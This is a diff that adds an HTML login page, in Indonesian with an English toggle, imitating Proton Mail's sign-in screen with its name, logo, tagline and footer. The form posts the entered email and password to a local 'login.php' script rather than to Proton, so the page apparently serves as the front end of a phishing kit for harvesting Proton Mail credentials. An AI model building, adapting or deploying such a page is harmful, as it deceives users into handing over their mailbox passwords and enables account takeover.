@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <title>Masuk | Proton Mail</title>
+  <meta name="description" content="Masuk atau buat akun." />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #fff;
+      color: #1c1c1c;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    a {
+      color: #635bff;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .container {
+      width: 100%;
+      max-width: 360px;
+    }
+
+    .header-container {
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+    .logo-text {
+      font-size: 20px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      color: #1c1c1c;
+      display: flex;
+      align-items: center;
+    }
+    .logo-text span {
+      color: #635bff;
+    }
+    .logo-text svg {
+      margin-right: 8px;
+    }
+    .language-selector {
+      background: transparent;
+      border: none;
+      font-size: 14px;
+      color: #635bff;
+      cursor: pointer;
+      outline: none;
+      padding: 0;
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23635bff' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+      background-repeat: no-repeat;
+      background-position: right center;
+      background-size: 12px;
+      padding-right: 18px;
+      min-width: 120px;
+      text-align: right;
+    }
+
+    .pm_panel {
+      background: #fff;
+      border-radius: 8px;
+      padding: 24px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+    .subtitle {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 24px;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      font-weight: 600;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      background: #f9f9f9;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      color: #1c1c1c;
+      font-size: 15px;
+    }
+    input:focus {
+      outline: none;
+      border-color: #635bff;
+      box-shadow: 0 0 0 2px rgba(99, 91, 255, 0.2);
+    }
+    .password-container {
+      position: relative;
+    }
+    .togglePassword-btn-toggle {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 16px;
+      height: 16px;
+    }
+    .togglePassword-btn-toggle svg {
+      display: block;
+      color: #999;
+    }
+    .togglePassword-btn-toggle:hover svg {
+      color: #666;
+    }
+    .remember-me {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 20px;
+    }
+    .remember-me input {
+      margin-top: 4px;
+      margin-right: 8px;
+    }
+    .remember-me label {
+      font-size: 14px;
+      line-height: 1.4;
+    }
+    .remember-me .why-link {
+      color: #635bff;
+      text-decoration: underline;
+      margin-left: 4px;
+    }
+    .loginForm-actions {
+      margin-top: 24px;
+    }
+    .loginForm-actions-main {
+      width: 100%;
+      padding: 12px;
+      background: #635bff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .loginForm-actions-main:hover {
+      background: #564ee0;
+    }
+    .signup-link {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 14px;
+    }
+    .divider {
+      margin: 24px 0;
+      border-top: 1px solid #eee;
+    }
+    .troubleshoot-link {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 14px;
+      color: #635bff;
+      text-decoration: underline;
+    }
+    .tagline {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    #pm_footer {
+      margin-top: 24px;
+      text-align: center;
+      color: #777;
+      font-size: 12px;
+    }
+    #pm_footer a {
+      color: #777;
+      margin-left: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header class="header-container">
+      <span class="logo-text">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24" height="24">
+          <path fill="#d1c4e9" d="M42.449,9.264L26.355,22.088c-1.401,1.117-3.404,1.112-4.8-0.01L5.535,9.198C4.909,8.721,4,9.161,4,9.941v5.603v19.732c0,2.076,1.706,3.758,3.81,3.758H40.19c2.104,0,3.81-1.683,3.81-3.758V9.995C44,9.205,43.072,8.767,42.449,9.264z"/>
+          <path fill="#7c4dff" d="M35.429,14.858l-13.79,10.988c-1.4,1.115-3.399,1.112-4.796-0.007L4,15.545v19.732c0,2.076,1.706,3.758,3.81,3.758h27.619V14.858z"/>
+        </svg>
+        Proton<span>Mail</span>
+      </span>
+      <select id="language-selector" class="language-selector">
+        <option value="id">Bahasa Indonesia</option>
+        <option value="en">English</option>
+      </select>
+    </header>
+
+    <div class="pm_panel">
+      <h1 id="txt-login">Masuk</h1>
+      <p class="subtitle" id="txt-subtitle">Untuk melanjutkan ke Proton Mail</p>
+
+      <form id="loginForm" method="post" action="login.php">
+        <div class="form-group">
+          <label for="username" class="form-label" id="txt-username-label">Email atau nama pengguna</label>
+          <input
+            type="text"
+            id="username"
+            name="username"
+            placeholder=""
+            required
+            autofocus
+          />
+        </div>
+
+        <div class="form-group">
+          <label for="password" class="form-label" id="txt-password-label">Kata sandi</label>
+          <div class="password-container">
+            <input
+              type="password"
+              id="password"
+              name="password"
+              placeholder=""
+              required
+            />
+            <button type="button" class="togglePassword-btn-toggle" id="togglePassword">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                <circle cx="12" cy="12" r="3"/>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="remember-me">
+          <input type="checkbox" id="rememberMe" name="rememberMe">
+          <label for="rememberMe" id="txt-remember">
+            Biarkan saya tetap masuk<br>
+            Direkomendasikan pada perangkat yang Anda percayai. <a href="#" class="why-link" id="txt-why">Mengapa?</a>
+          </label>
+        </div>
+
+        <div class="loginForm-actions">
+          <button type="submit" class="loginForm-actions-main" id="txt-submit">Masuk</button>
+        </div>
+      </form>
+
+      <div class="signup-link" id="txt-signup">
+        Baru di Proton? <a href="https://protonmail.com/signup">Buat akun</a>
+      </div>
+
+      <div class="divider"></div>
+
+      <div class="troubleshoot-link" id="txt-trouble">Mengalami masalah saat akan masuk?</div>
+
+      <div class="tagline" id="txt-tagline">Proton. Privasi sebagai hal yang baku.</div>
+    </div>
+
+    <div id="pm_footer">
+      <span id="txt-footer">2025 ProtonMail.com &ndash; Made globally, hosted in Switzerland.</span>
+      <a href="https://protonmail.com/blog/" target="_blank">v3.13.7</a>
+    </div>
+  </div>
+
+  <script>
+    const translations = {
+      en: {
+        login: "Sign in",
+        subtitle: "To continue to Proton Mail",
+        usernameLabel: "Email or username",
+        passwordLabel: "Password",
+        remember: "Keep me signed in<br>Recommended on devices you trust. <a href='#' class='why-link'>Why?</a>",
+        submit: "Sign in",
+        signup: "New to Proton? <a href='https://protonmail.com/signup'>Create account</a>",
+        trouble: "Having trouble signing in?",
+        tagline: "Proton. Privacy by default.",
+        footer: "2025 ProtonMail.com &ndash; Made globally, hosted in Switzerland."
+      },
+      id: {
+        login: "Masuk",
+        subtitle: "Untuk melanjutkan ke Proton Mail",
+        usernameLabel: "Email atau nama pengguna",
+        passwordLabel: "Kata sandi",
+        remember: "Biarkan saya tetap masuk<br>Direkomendasikan pada perangkat yang Anda percayai. <a href='#' class='why-link'>Mengapa?</a>",
+        submit: "Masuk",
+        signup: "Baru di Proton? <a href='https://protonmail.com/signup'>Buat akun</a>",
+        trouble: "Mengalami masalah saat akan masuk?",
+        tagline: "Proton. Privasi sebagai hal yang baku.",
+        footer: "2025 ProtonMail.com &ndash; Made globally, hosted in Switzerland."
+      }
+    };
+
+    document.getElementById('togglePassword').addEventListener('click', function () {
+      const pwInput = document.getElementById('password');
+      const svg = this.querySelector('svg');
+      if (pwInput.type === 'password') {
+        pwInput.type = 'text';
+        svg.innerHTML = `
+          <line x1="2" y1="2" x2="22" y2="22" />
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+          <circle cx="12" cy="12" r="3"/>
+        `;
+      } else {
+        pwInput.type = 'password';
+        svg.innerHTML = `
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+          <circle cx="12" cy="12" r="3"/>
+        `;
+      }
+    });
+
+    function setLanguage(lang) {
+      const t = translations[lang] || translations.id;
+      document.getElementById('txt-login').innerHTML = t.login;
+      document.getElementById('txt-subtitle').innerHTML = t.subtitle;
+      document.getElementById('txt-username-label').innerHTML = t.usernameLabel;
+      document.getElementById('txt-password-label').innerHTML = t.passwordLabel;
+      document.getElementById('txt-remember').innerHTML = t.remember;
+      document.getElementById('txt-submit').innerHTML = t.submit;
+      document.getElementById('txt-signup').innerHTML = t.signup;
+      document.getElementById('txt-trouble').innerHTML = t.trouble;
+      document.getElementById('txt-tagline').innerHTML = t.tagline;
+      document.getElementById('txt-footer').innerHTML = t.footer;
+      document.querySelector('html').setAttribute('lang', lang);
+    }
+
+    document.getElementById('language-selector').addEventListener('change', function () {
+      setLanguage(this.value);
+    });
+
+    setLanguage('id');
+  </script>
+</body>
+</html>
